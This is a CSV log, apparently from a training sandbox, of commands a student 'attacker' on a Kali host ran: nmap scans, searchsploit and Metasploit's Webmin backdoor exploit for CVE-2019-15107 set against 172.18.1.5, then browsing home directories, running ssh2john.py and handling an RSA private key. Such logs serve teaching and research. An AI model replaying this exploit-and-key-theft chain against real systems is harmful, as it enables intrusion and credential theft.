sandbox_id,cmd_type,cmd_name,cmd_arguments,hostname,ip,level,username,timestamp_str,relative_timestamp_str
649,bash-command,BdC2V8RnF8i8gwppc2eenbU/PIdDTu6M2LTO4aAM5wxwKXgkTdJuUxmNH...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.253Z,1970-01-01T01:20:05.588Z
649,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.338Z,1970-01-01T01:20:05.673Z
649,bash-command,/DJyNP3xqCknFLIVTBwVSsHqnHSN6ZCl8BteFdRsf6kAj6qm1/cAfL73o...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.375Z,1970-01-01T01:20:05.710Z
649,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.580Z,1970-01-01T01:20:05.915Z
649,bash-command,5PHI1jf+WoJVaRKQLzFfaMrY0rhU6TsQTYdm2QYcSszE1fhLdXGNKpath...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.603Z,1970-01-01T01:20:05.938Z
649,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.790Z,1970-01-01T01:20:06.125Z
649,bash-command,RPbgJfB0PuzwpzcKesh5j+AnjKQjZcG1vHnrgvDFnd5VNOOrTzdUnMA0D...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.827Z,1970-01-01T01:20:06.162Z
649,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.901Z,1970-01-01T01:20:06.236Z
649,bash-command,vkjUvPbdIkQlNuBL0FWZl/2vHf/xWWex4Q0plLf7lRWJsCDtiKflKHL/S...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:07.937Z,1970-01-01T01:20:06.272Z
649,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.126Z,1970-01-01T01:20:06.461Z
649,bash-command,TwKMZJ4885lBJfN3AG9kj4azCLK6IcAuRoxTmAtYrntQWLtDCHyaCW6dZ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.165Z,1970-01-01T01:20:06.500Z
649,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.236Z,1970-01-01T01:20:06.571Z
649,bash-command,pghYqk7inYawVLDG9f5ej+1MYQNfScZYpQ/IEH2jfbRgQsXj7zgtS9ewQ...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.272Z,1970-01-01T01:20:06.607Z
649,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.461Z,1970-01-01T01:20:06.796Z
649,bash-command,TC+mWTFkXW5YlN9Bu1uZ2CgYQJF0Dx1ns5x3IeF+U5z56KRqaKFJPfRQg...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.498Z,1970-01-01T01:20:06.833Z
649,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.572Z,1970-01-01T01:20:06.907Z
649,bash-command,0v/8aKPlPwfmS28OtxtE96zQI3SAAy7AdwkBepz5Pk9iotqIQPk5fY68w...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.609Z,1970-01-01T01:20:06.944Z
649,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.682Z,1970-01-01T01:20:07.017Z
649,bash-command,d712Dnn4OPYaqzMTyWz/dRiWcax9bFhNV+9Gp1OoA7hhBO5daLoul3EYx...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.719Z,1970-01-01T01:20:07.054Z
649,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.907Z,1970-01-01T01:20:07.242Z
649,bash-command,qJkjc4ljMYr9wvRRcWEhlvQV6LTk2FiYOY4tjRneLXMfsb2BUwSFDXDwD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:08.945Z,1970-01-01T01:20:07.280Z
649,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.132Z,1970-01-01T01:20:07.467Z
649,bash-command,rk6oUkbp2aFy5SgMwdlm6tc5sHVHVOLTfeyv7AvRUOaGXbbrUBw1rxgsw...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.169Z,1970-01-01T01:20:07.504Z
649,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.247Z,1970-01-01T01:20:07.582Z
649,bash-command,anC3ZW1EHY/nUmSq9myKG5rPdgFhqx7lPBb5eXSGcA+rFkxkQwbtROw73...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.284Z,1970-01-01T01:20:07.619Z
649,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.366Z,1970-01-01T01:20:07.701Z
649,bash-command,FKuYCbpmfnY0ZBxR9NVh/kRpv5VI013Mwqk2lcuJTc+mjlHOymyXAhY02...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.411Z,1970-01-01T01:20:07.746Z
649,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.480Z,1970-01-01T01:20:07.815Z
649,bash-command,TleEMFlW9oXD56B21kVdPDP9McdLgC9//2pSh8sI5kJEsNd294g8ju/dD...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.517Z,1970-01-01T01:20:07.852Z
649,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.714Z,1970-01-01T01:20:08.049Z
649,bash-command,aqa9d+Nsbodr90LgBOFRdtxUeYihXLS2ZfXE5wYfTwX17ZIoFLuYamE6O...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.751Z,1970-01-01T01:20:08.086Z
649,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.824Z,1970-01-01T01:20:08.159Z
649,bash-command,uSoF68eAZXd6R9bL03s9HQvGkSZv8zaFlmK4wRVI5frYMlU5gzD5E/e6I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.861Z,1970-01-01T01:20:08.196Z
649,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.934Z,1970-01-01T01:20:08.269Z
649,bash-command,pq5zI0lH1Vf4jlhYpD/PXMmULzR28OIOVrkcUeZPVlv+aIpLd6zbe8mfI...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:09.971Z,1970-01-01T01:20:08.306Z
649,bash-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.049Z,1970-01-01T01:20:08.384Z
649,bash-command,Q9Z2LPIWU200w5daHsXp/qukKdDn1CB4JinKvtLka3Q4i6EHj+Vp7bvhm...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.092Z,1970-01-01T01:20:08.427Z
649,bash-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.193Z,1970-01-01T01:20:08.528Z
649,bash-command,/BXnD+JMm+w9ZTRsHqrXKsAEyVhM99hWoFz2k1s+Q003y/7I/0XmPETD4...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.216Z,1970-01-01T01:20:08.551Z
649,bash-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.291Z,1970-01-01T01:20:08.626Z
649,bash-command,WzolChBDCjWIMZ/9j5JREtzWX3s7+k32TFws/jPKzXEB21M2Szn23pkoX...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.330Z,1970-01-01T01:20:08.665Z
649,bash-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.519Z,1970-01-01T01:20:08.854Z
649,bash-command,bTXmV+hQf+gS7PjVRthqPONau6on19uDDVXNeuVygP4T8H5v6kAurFVX1...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.556Z,1970-01-01T01:20:08.891Z
649,bash-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.631Z,1970-01-01T01:20:08.966Z
649,bash-command,sCLJmNBb/7o7QR1Hhvo7NN1z85CJr9yxC6MqLbbcv91Mhb3w1Ce2eL+Qn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.673Z,1970-01-01T01:20:09.008Z
649,bash-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.863Z,1970-01-01T01:20:09.198Z
649,bash-command,I0lvTSHTPFgvw00pV4bypACc28X+0YjRVRFOxqZxidw256pubOjRjIHIG...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.900Z,1970-01-01T01:20:09.235Z
649,bash-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:10.973Z,1970-01-01T01:20:09.308Z
649,bash-command,W3XiLqeGN7DLwY8X6RXfqafVQmJR6j3zB/PAoSVh25eTQwl2i1rgYzo0I...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.010Z,1970-01-01T01:20:09.345Z
649,bash-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.084Z,1970-01-01T01:20:09.419Z
649,bash-command,KHGCl8kHWe7ks3KT4+WU9uZZAhAECaWJvLzo2Ba6dst/Ke7KEtmGwv5Ex...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.124Z,1970-01-01T01:20:09.459Z
649,bash-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.308Z,1970-01-01T01:20:09.643Z
649,bash-command,0mt+olWJFSJa072UPuHe7gWdlexqh0l59q4ohOG+zJke1u74Br9wo6KIv...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.344Z,1970-01-01T01:20:09.679Z
649,bash-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.548Z,1970-01-01T01:20:09.883Z
649,bash-command,y2O0rVCjsin3d2h9F0Fp0Xvc3EHZD7ct2HvZEV6x3kUlfdWeHKuF+7wUe...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.588Z,1970-01-01T01:20:09.923Z
649,bash-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.798Z,1970-01-01T01:20:10.133Z
649,bash-command,9+LnogQTclKAVk8htnrxBQh7aPLBAyTaXACAL31bB0ZXfh0yhJX6bXIe+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.837Z,1970-01-01T01:20:10.172Z
649,bash-command,rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Ie...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.911Z,1970-01-01T01:20:10.246Z
649,bash-command,rJf/WLYf6/Lmfgv/ECF+VqdLPGkLT8dEgrajh9t2TaoU+/+mxtGXaJ7Ie...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:11.950Z,1970-01-01T01:20:10.285Z
649,bash-command,22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwl...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.025Z,1970-01-01T01:20:10.360Z
649,bash-command,22unE+jCDSQMF9IygWb8HfzBsruZ7IQ+/h7g7XDpEZrJf6+mdmbzBXLwl...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.063Z,1970-01-01T01:20:10.398Z
649,bash-command,FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.139Z,1970-01-01T01:20:10.474Z
649,bash-command,FEJ08UNnUQsuqoD+vPxunBwkFv5b/5yt0XMu9tZdXk9AW9BdasCIE1bY+...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.176Z,1970-01-01T01:20:10.511Z
649,bash-command,rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.273Z,1970-01-01T01:20:10.608Z
649,bash-command,rjmFQ+KmCqH5lReI0Ai3fJ8pnZ2D3/m7AV/1llNaijp9NmriqK0jiVBpn...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.290Z,1970-01-01T01:20:10.625Z
649,bash-command,WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.367Z,1970-01-01T01:20:10.702Z
649,bash-command,WtUQOqd4QS2S8MwjPoBZ0hpXOY0JX95EvWhp58uOy0/o8yYSbb+bZe7g0...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.403Z,1970-01-01T01:20:10.738Z
649,bash-command,Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm9...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.481Z,1970-01-01T01:20:10.816Z
649,bash-command,Rj6xI5CiBdDo83VdQHlyaUawTlv/wUpqSRc9xsK/y2dLjzQhAD+QkWbm9...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.516Z,1970-01-01T01:20:10.851Z
649,bash-command,Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAT...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.592Z,1970-01-01T01:20:10.927Z
649,bash-command,Tlqk1XDm0e9sNcXus5d5pnTWeCH4bnwnQDo0Ot/KljNmnG11/FXuPFnAT...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.628Z,1970-01-01T01:20:10.963Z
649,bash-command,SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlL...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.704Z,1970-01-01T01:20:11.039Z
649,bash-command,SqV4xTHhlfTZQcjVD+Rc44JkIFTr2gzDvcLOOMwcBf232/ySokL9xuMlL...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.742Z,1970-01-01T01:20:11.077Z
649,bash-command,pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.938Z,1970-01-01T01:20:11.273Z
649,bash-command,pG3A2vBQ1t0A62BglfKCobl9JVRwFhIIh4dzevvvtCuWnXk7AhodGIVF2...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:12.976Z,1970-01-01T01:20:11.311Z
649,bash-command,q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+k...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.171Z,1970-01-01T01:20:11.506Z
649,bash-command,q5ydQjEjf0ByejEAZt7EM14Ey9sHQhX83OWMb7Brqfzsfapkuplvnj1+k...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.209Z,1970-01-01T01:20:11.544Z
649,bash-command,ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5u...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.411Z,1970-01-01T01:20:11.746Z
649,bash-command,ytH5k1zr7ZQ5k2FasEDPwdVjSQfOW8G3CJ8GgpFokCL+KiwfvR3mJBM5u...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.449Z,1970-01-01T01:20:11.784Z
649,bash-command,UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.524Z,1970-01-01T01:20:11.859Z
649,bash-command,UG2CX9gT4nU7h9RAhtu2p/F5FEGLVbX5GxJhvKP11MQqSsWI3OY3gTvG6...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.563Z,1970-01-01T01:20:11.898Z
649,bash-command,r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gA...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.638Z,1970-01-01T01:20:11.973Z
649,bash-command,r4aMTuuESZSksPLDMwgkYTvWp/qaNnVpqaSHe1p2hk2DvEhIH7eSkK9gA...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.675Z,1970-01-01T01:20:12.010Z
649,bash-command,sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTz...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.750Z,1970-01-01T01:20:12.085Z
649,bash-command,sah7VmkiXIRvhXdcVA/QXlpG7NfOVGfm/zVDfpWPAGUrGegNb3X5Y6QTz...,NONE,attacker,10.1.135.83,38,kali,2022-05-04T07:58:13.787Z,1970-01-01T01:20:12.122Z
649,bash-command,-----END,RSA PRIVATE KEY-----(newline),attacker,10.1.135.83,38,kali,2022-05-04T07:58:19.032Z,1970-01-01T01:20:17.367Z
649,bash-command,-----END,RSA PRIVATE KEY-----(newline),attacker,10.1.135.83,38,kali,2022-05-04T07:58:19.110Z,1970-01-01T01:20:17.445Z
649,bash-command,-----END,RSA PRIVATE KEY-----(newline),attacker,10.1.135.83,38,kali,2022-05-04T07:58:19.248Z,1970-01-01T01:20:17.583Z
649,bash-command,cat,key,attacker,10.1.135.83,38,kali,2022-05-04T07:58:24.041Z,1970-01-01T01:20:22.376Z
675,bash-command,ping,172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T10:16:10.041Z,1970-01-01T00:08:00.591Z
675,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T10:17:11.366Z,1970-01-01T00:09:01.916Z
675,bash-command,man,nmap,attacker,10.1.135.83,34,kali,2022-05-04T10:17:39.136Z,1970-01-01T00:09:29.686Z
675,bash-command,nmap,-A -T4 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T10:18:38.937Z,1970-01-01T00:10:29.487Z
675,msf-command,help,NONE,attacker,10.1.135.83,36,null,2022-05-04T10:40:48.076Z,1970-01-01T00:32:38.626Z
675,msf-command,search,NONE,attacker,10.1.135.83,36,null,2022-05-04T10:41:20.673Z,1970-01-01T00:33:11.223Z
675,msf-command,search,cve:CVE-2019-15107,attacker,10.1.135.83,36,null,2022-05-04T10:42:30.669Z,1970-01-01T00:34:21.219Z
675,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T10:43:02.821Z,1970-01-01T00:34:53.371Z
675,msf-command,exit,NONE,attacker,10.1.135.83,36,null,2022-05-04T10:44:10.007Z,1970-01-01T00:36:00.557Z
675,bash-command,msfconsole,NONE,attacker,10.1.135.83,36,kali,2022-05-04T10:44:10.069Z,1970-01-01T00:36:00.619Z
675,msf-command,use,exploit/unix/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T10:44:42.289Z,1970-01-01T00:36:32.839Z
675,msf-command,use,exploit/linux/http/webmin_backdoor,attacker,10.1.135.83,36,null,2022-05-04T10:44:56.930Z,1970-01-01T00:36:47.480Z
675,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T10:46:41.109Z,1970-01-01T00:38:31.659Z
675,msf-command,RHOSTS,172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T10:47:22.076Z,1970-01-01T00:39:12.626Z
675,msf-command,set,RHOSTS 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T10:47:43.783Z,1970-01-01T00:39:34.333Z
675,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T10:47:48.474Z,1970-01-01T00:39:39.024Z
675,msf-command,set,SRVHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T10:48:40.449Z,1970-01-01T00:40:30.999Z
675,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T10:48:52.745Z,1970-01-01T00:40:43.295Z
675,msf-command,set,LHOST 172.18.1.5,attacker,10.1.135.83,36,null,2022-05-04T10:49:37.350Z,1970-01-01T00:41:27.900Z
675,msf-command,exploit,NONE,attacker,10.1.135.83,36,null,2022-05-04T10:49:48.253Z,1970-01-01T00:41:38.803Z
675,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T10:51:00.491Z,1970-01-01T00:42:51.041Z
675,bash-command,arp,-a,attacker,10.1.135.83,37,kali,2022-05-04T10:58:40.061Z,1970-01-01T00:50:30.611Z
675,bash-command,ls,-l /home,attacker,10.1.135.83,37,kali,2022-05-04T11:02:02.028Z,1970-01-01T00:53:52.578Z
675,bash-command,ls,-l /home/user-access,attacker,10.1.135.83,37,kali,2022-05-04T11:02:25.038Z,1970-01-01T00:54:15.588Z
675,bash-command,ls,-l /home/use,attacker,10.1.135.83,37,kali,2022-05-04T11:02:32.448Z,1970-01-01T00:54:22.998Z
675,bash-command,ls,-l /home/user,attacker,10.1.135.83,37,kali,2022-05-04T11:02:35.161Z,1970-01-01T00:54:25.711Z
675,bash-command,ls,-l /home/debian,attacker,10.1.135.83,37,kali,2022-05-04T11:02:40.942Z,1970-01-01T00:54:31.492Z
675,bash-command,ls,-l /home/kali,attacker,10.1.135.83,37,kali,2022-05-04T11:02:47.389Z,1970-01-01T00:54:37.939Z
675,bash-command,cat,ssh2john.py,attacker,10.1.135.83,37,kali,2022-05-04T11:03:05.225Z,1970-01-01T00:54:55.775Z
675,bash-command,ls,-l /home/kali,attacker,10.1.135.83,37,kali,2022-05-04T11:04:24.822Z,1970-01-01T00:56:15.372Z
675,bash-command,python,ssh2john.py,attacker,10.1.135.83,37,kali,2022-05-04T11:04:53.554Z,1970-01-01T00:56:44.104Z
675,bash-command,man,ls,attacker,10.1.135.83,37,kali,2022-05-04T11:06:28.474Z,1970-01-01T00:58:19.024Z
675,bash-command,man,ls -la,attacker,10.1.135.83,37,kali,2022-05-04T11:06:34.648Z,1970-01-01T00:58:25.198Z
675,bash-command,ls,-la /home,attacker,10.1.135.83,37,kali,2022-05-04T11:09:26.893Z,1970-01-01T01:01:17.443Z
675,bash-command,ls,-la /home/debian,attacker,10.1.135.83,37,kali,2022-05-04T11:09:44.309Z,1970-01-01T01:01:34.859Z
675,bash-command,ls,-la /home/kali,attacker,10.1.135.83,37,kali,2022-05-04T11:11:54.976Z,1970-01-01T01:03:45.526Z
675,bash-command,nano,id_rsa,attacker,10.1.135.83,38,kali,2022-05-04T11:33:32.175Z,1970-01-01T01:25:22.725Z
660,bash-command,sudo,nmap 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T10:11:35.903Z,1970-01-01T00:05:26.286Z
660,bash-command,sudo,nmap -sV 172.18.1.5,attacker,10.1.135.83,34,kali,2022-05-04T10:12:29.556Z,1970-01-01T00:06:19.939Z
660,bash-command,searchsploit,webmin,attacker,10.1.135.83,35,kali,2022-05-04T10:13:10.238Z,1970-01-01T00:07:00.621Z
660,bash-command,msfconsoe,NONE,attacker,10.1.135.83,35,kali,2022-05-04T10:14:07.622Z,1970-01-01T00:07:58.005Z
660,msf-command,search,webmin,attacker,10.1.135.83,35,null,2022-05-04T10:14:30.963Z,1970-01-01T00:08:21.346Z
660,msf-command,use,2,attacker,10.1.135.83,35,null,2022-05-04T10:14:39.681Z,1970-01-01T00:08:30.064Z
660,msf-command,show,opt,attacker,10.1.135.83,35,null,2022-05-04T10:14:42.538Z,1970-01-01T00:08:32.921Z
660,msf-command,show,o,attacker,10.1.135.83,35,null,2022-05-04T10:14:43.979Z,1970-01-01T00:08:34.362Z
660,msf-command,show,options,attacker,10.1.135.83,35,null,2022-05-04T10:14:45.715Z,1970-01-01T00:08:36.098Z
660,bash-command,msfconsole,NONE,attacker,10.1.135.83,35,kali,2022-05-04T10:14:52.944Z,1970-01-01T00:08:43.327Z
660,bash-command,ip,a,attacker,10.1.135.83,35,kali,2022-05-04T10:14:56.340Z,1970-01-01T00:08:46.723Z
660,msf-command,search,webmin,attacker,10.1.135.83,35,null,2022-05-04T10:15:11.709Z,1970-01-01T00:09:02.092Z
660,msf-command,use,5,attacker,10.1.135.83,35,null,2022-05-04T10:15:21.334Z,1970-01-01T00:09:11.717Z
660,msf-command,show,options,attacker,10.1.135.83,36,null,2022-05-04T10:16:05.428Z,1970-01-01T00:09:55.811Z
660,msf-command,set,LHOST 10.1.135.83,attacker,10.1.135.83,36,null,2022-05-04T10:16:11.836Z,1970-01-01T00:10:02.219Z
